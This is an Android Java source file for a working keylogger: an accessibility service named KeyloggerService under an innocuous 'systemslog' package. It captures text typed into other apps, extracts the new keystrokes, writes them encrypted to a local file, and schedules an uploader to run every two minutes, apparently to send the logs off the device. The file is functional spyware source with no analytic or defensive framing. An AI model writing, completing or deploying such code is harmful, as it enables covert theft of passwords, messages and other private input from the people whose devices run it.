package com.example.systemslog;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;
import java.io.FileOutputStream;
import android.content.Context;

import androidx.work.WorkManager;
import androidx.work.PeriodicWorkRequest;

import java.util.concurrent.TimeUnit;

public class KeyloggerService extends AccessibilityService {

    private static final String TAG = "KeyloggerService";
    private StringBuilder logBuffer = new StringBuilder();
    private String lastText = "";

    @Override
    public void onServiceConnected() {
        scheduleUploader();
        Log.d(TAG, "✅ KeyloggerService connected");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String currentText = "";
            if (event.getText() != null && !event.getText().isEmpty()) {
                currentText = event.getText().get(0).toString(); // Get first item from the list
            }
            String delta = getDifference(lastText, currentText);

            if (!delta.isEmpty()) {
                logBuffer.append(delta);
                lastText = currentText;

                if (logBuffer.length() > 100) {
                    saveEncrypted(logBuffer.toString());
                    logBuffer.setLength(0);
                }
            }
        }
    }

    private String getDifference(String oldStr, String newStr) {
        int minLen = Math.min(oldStr.length(), newStr.length());

        int i = 0;
        while (i < minLen && oldStr.charAt(i) == newStr.charAt(i)) {
            i++;
        }

        if (newStr.length() > oldStr.length()) {
            return newStr.substring(i);
        } else if (oldStr.length() > newStr.length()) {
            return "[DEL]";
        } else {
            return "";
        }
    }

    private void saveEncrypted(String text) {
        try {
            String encrypted = EncryptionUtils.encrypt(text);
            FileOutputStream fos = openFileOutput("keylog.enc", Context.MODE_APPEND);
            fos.write((encrypted + "\n").getBytes());
            fos.close();
            Log.d(TAG, "🔐 Encrypted keystrokes saved");
        } catch (Exception e) {
            Log.e(TAG, "❌ Failed to save encrypted log", e);
        }
    }

    private void scheduleUploader() {
        PeriodicWorkRequest request = new PeriodicWorkRequest
                .Builder(LogUploader.class, 2, TimeUnit.MINUTES)
                .build();

        WorkManager.getInstance(this).enqueue(request);
    }

    @Override
    public void onInterrupt() {}
}
